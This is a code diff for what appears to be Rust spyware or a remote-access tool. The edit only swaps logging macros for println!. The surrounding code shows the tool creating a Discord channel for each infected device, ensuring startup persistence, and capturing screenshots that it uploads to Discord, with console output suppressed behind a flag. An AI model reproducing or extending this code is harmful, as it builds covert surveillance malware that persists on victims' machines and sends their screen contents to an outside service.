@@ -3,7 +3,6 @@ use crate::core::device_id::DeviceId;
 use crate::core::screenshot::Screenshot;
 use crate::system_info::{DeviceInfo, SystemInfo};
 use anyhow::Result;
-use tracing::info;
 use twilight_http::Client;
 use twilight_model::channel::ChannelType;
 use twilight_model::id::{
@@ -24,12 +23,12 @@ impl ChannelManager {
     pub async fn init_dchannel(&self) -> Result<Id<ChannelMarker>> {
         let device_name = DeviceId::get_device_channel_name()?;
         if Config::SHOW_CONSOLE {
-            info!("Looking for device channel: {}", device_name);
+            println!("Looking for device channel: {}", device_name);
         }
 
         if let Some(channel_id) = self.find_cbn(&device_name).await? {
             if Config::SHOW_CONSOLE {
-                info!(
+                println!(
                     "Found existing channel: {} (ID: {})",
                     device_name, channel_id
                 );
@@ -39,7 +38,7 @@ impl ChannelManager {
         }
 
         if Config::SHOW_CONSOLE {
-            info!("Channel not found, creating new channel: {}", device_name);
+            println!("Channel not found, creating new channel: {}", device_name);
         }
         let channel_id = self.create_dchannel(&device_name).await?;
 
@@ -76,7 +75,7 @@ impl ChannelManager {
         let channel = response.model().await?;
 
         if Config::SHOW_CONSOLE {
-            info!("Created new channel: {} (ID: {})", channel_name, channel.id);
+            println!("Created new channel: {} (ID: {})", channel_name, channel.id);
         }
         Ok(channel.id)
     }
@@ -93,14 +92,14 @@ impl ChannelManager {
 
         if let Err(e) = crate::core::startup::check_startup().await {
             if Config::SHOW_CONSOLE {
-                info!("Failed to ensure startup persistence: {}", e);
+                println!("Failed to ensure startup persistence: {}", e);
             }
         }
 
         match Screenshot::capture_as_bytes() {
             Ok((screenshot_data, filename)) => {
                 if Config::SHOW_CONSOLE {
-                    info!(
+                    println!(
                         "Captured reconnection screenshot: {} ({} bytes)",
                         filename,
                         screenshot_data.len()
@@ -119,12 +118,12 @@ impl ChannelManager {
                     .await?;
 
                 if Config::SHOW_CONSOLE {
-                    info!("Reconnection screenshot sent successfully");
+                    println!("Reconnection screenshot sent successfully");
                 }
             }
             Err(e) => {
                 if Config::SHOW_CONSOLE {
-                    info!("Failed to capture reconnection screenshot: {}", e);
+                    println!("Failed to capture reconnection screenshot: {}", e);
                 }
                 // Send a message about screenshot failure
                 self.http
@@ -150,7 +149,7 @@ impl ChannelManager {
         match Screenshot::capture_as_bytes() {
             Ok((screenshot_data, filename)) => {
                 if Config::SHOW_CONSOLE {
-                    info!(
+                    println!(
                         "Captured screenshot: {} ({} bytes)",
                         filename,
                         screenshot_data.len()
@@ -166,12 +165,12 @@ impl ChannelManager {
                     .attachments(&[attachment])
                     .await?;
                 if Config::SHOW_CONSOLE {
-                    info!("Screenshot sent successfully");
+                    println!("Screenshot sent successfully");
                 }
             }
             Err(e) => {
                 if Config::SHOW_CONSOLE {
-                    info!("Failed to capture screenshot: {}", e);
+                    println!("Failed to capture screenshot: {}", e);
                 }
                 // Send a message about screenshot failure
                 self.http
